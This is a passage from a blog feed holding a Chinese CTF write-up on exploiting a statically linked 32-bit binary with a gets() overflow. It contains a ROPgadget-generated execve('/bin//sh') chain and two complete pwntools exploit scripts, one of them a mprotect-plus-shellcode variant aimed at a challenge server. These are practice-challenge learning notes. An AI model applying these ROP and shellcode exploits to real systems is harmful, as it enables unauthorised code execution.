        <tags>
            
            <tag> BUU-PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>inndy_rop--mprotect函数</title>
      <link href="/2020/09/27/inndy-rop-mprotect-han-shu/"/>
      <url>/2020/09/27/inndy-rop-mprotect-han-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec rop<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/rop'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>    只有NX开启<span class="token punctuation">.</span>/ropasdassssssssssssssssSegmentation <span class="token function">fault</span> <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">_BYTE <span class="token operator">*</span><span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>刚打开IDA就被一大堆函数给吓到了，这应该就是静态编译的程序所以程序不会调用libc库，直接在二进制文件中实现函数。</strong></p><pre class=" language-java"><code class="language-java">$file roprop<span class="token operator">:</span> ELF <span class="token number">32</span><span class="token operator">-</span>bit LSB executable<span class="token punctuation">,</span> Intel <span class="token number">80386</span><span class="token punctuation">,</span> version <span class="token function">1</span> <span class="token punctuation">(</span>GNU<span class="token operator">/</span>Linux<span class="token punctuation">)</span><span class="token punctuation">,</span> statically linked<span class="token punctuation">,</span> <span class="token keyword">for</span> GNU<span class="token operator">/</span>Linux <span class="token number">2.6</span><span class="token punctuation">.</span><span class="token number">32</span><span class="token punctuation">,</span> statically 静态编译</code></pre><p>静态编译我之前也就听过而已，这是第一次遇到，没办法就去看大佬的文章了。</p><h3 id="Ropgadget-–ropchain-直接利用程序中的片段拼凑rop链。"><a href="#Ropgadget-–ropchain-直接利用程序中的片段拼凑rop链。" class="headerlink" title="Ropgadget –ropchain 直接利用程序中的片段拼凑rop链。"></a>Ropgadget –ropchain 直接利用程序中的片段拼凑rop链。</h3><p>ROPgadget –binary rop –ropchain</p><pre class=" language-java"><code class="language-java">ROP chain generation<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">-</span> Step <span class="token number">1</span> <span class="token operator">--</span> Write<span class="token operator">-</span>what<span class="token operator">-</span>where gadgets    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8050cc5</span> mov dword ptr <span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span> edi <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> pop esi <span class="token punctuation">;</span> pop edi <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8048433</span> pop esi <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x8048480</span> pop edi <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> Can<span class="token string">'t find the '</span>xor edi<span class="token punctuation">,</span> edi<span class="token string">' gadget. Try with another '</span>mov <span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> r'    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x805466b</span> mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806ecda</span> pop edx <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80b8016</span> pop eax <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80492d3</span> xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret<span class="token operator">-</span> Step <span class="token number">2</span> <span class="token operator">--</span> Init syscall number gadgets    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80492d3</span> xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x807a66f</span> inc eax <span class="token punctuation">;</span> ret<span class="token operator">-</span> Step <span class="token number">3</span> <span class="token operator">--</span> Init syscall arguments gadgets    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80481c9</span> pop ebx <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x80de769</span> pop ecx <span class="token punctuation">;</span> ret    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806ecda</span> pop edx <span class="token punctuation">;</span> ret<span class="token operator">-</span> Step <span class="token number">4</span> <span class="token operator">--</span> Syscall gadget    <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Gadget found<span class="token operator">:</span> <span class="token number">0x806c943</span> <span class="token keyword">int</span> <span class="token number">0x80</span><span class="token operator">-</span> Step <span class="token number">5</span> <span class="token operator">--</span> Build the ROP chain  #这里可以直接复制过去做payload了    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env python2    # execve generated by ROPgadget    from struct <span class="token keyword">import</span> pack    # Padding goes here    p <span class="token operator">=</span> <span class="token string">''</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> # pop eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token string">'/bin'</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">4</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> # pop eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token string">'//sh'</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> # xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> # mov dword ptr <span class="token punctuation">[</span>edx<span class="token punctuation">]</span><span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> # pop ebx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> # pop ecx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> # pop edx <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> # @ <span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token number">8</span>    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> # xor eax<span class="token punctuation">,</span> eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret    p <span class="token operator">+=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> # inc eax <span class="token punctuation">;</span> ret</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> packcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'rop'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26186</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">'/bin'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b8016</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">'//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0805466b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de769</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806ecda</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080492d3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a66f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806c943</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'matrix\n'</span>matrix$  </code></pre><p>从这里学到一个新方法：<a href="https://www.yuque.com/u239977/cbzkn3/sam1zw" target="_blank" rel="noopener">https://www.yuque.com/u239977/cbzkn3/sam1zw</a> 并再次膜拜大佬</p><blockquote><p>mprotect函数：<br>原型：int mprotect(const void *start, size_t len, int prot)<br>参数解释：<br>start：需改写属性的内存中开始地址<br>len：需改写属性的内存长度<br>prot：需要修改为的指定值<br>功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>1）PROT_READ：表示内存段内的内容可写；<br>2）PROT_WRITE：表示内存段内的内容可读；<br>3）PROT_EXEC：表示内存段中的内容可执行；<br>4）PROT_NONE：表示内存段中的内容根本没法访问。<br>注意：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>prot=7 是可读可写可执行<br>从IDA中可以搜到 这个函数的存在。</p></blockquote><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmapLEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA <span class="token number">0x8048000</span>  <span class="token number">0x80e9000</span> r<span class="token operator">-</span>xp    a1000 <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>PWN<span class="token operator">/</span>BUU<span class="token operator">/</span>rop <span class="token number">0x80e9000</span>  <span class="token number">0x80eb000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> a0000  <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>PWN<span class="token operator">/</span>BUU<span class="token operator">/</span>rop  （data） <span class="token number">0x80eb000</span>  <span class="token number">0x810f000</span> rw<span class="token operator">-</span>p    <span class="token number">24000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span><span class="token number">0xf7ff9000</span> <span class="token number">0xf7ffc000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span><span class="token number">0xf7ffc000</span> <span class="token number">0xf7ffe000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span><span class="token number">0xfffdd000</span> <span class="token number">0xffffe000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>pwndbg<span class="token operator">></span> 从vmmap可以知道<span class="token number">0x80e9000</span>  <span class="token number">0x80eb000</span>  data段可读可写，所以利用这个mprotect函数再加一个可执行</code></pre><p>然后read函数读取shellcode到这里即可</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP~"></a>EXP~</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'rop'</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>mprotect <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>data_addr <span class="token operator">=</span> <span class="token number">0x080e9000</span>pop3_ret <span class="token operator">=</span> <span class="token number">0x0804ef14</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('node3.buuoj.cn',26186)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop3_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ cat flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x9</span> bytes<span class="token operator">:</span>    <span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x25</span> bytes<span class="token operator">:</span>    <span class="token string">'cat: flag: No such file or directory\n'</span>cat<span class="token operator">:</span> flag<span class="token operator">:</span> No such file or directory$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUU-PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF 2nd]secret</title>
      <link href="/2020/09/27/bjdctf-2nd-secret/"/>
      <url>/2020/09/27/bjdctf-2nd-secret/</url>
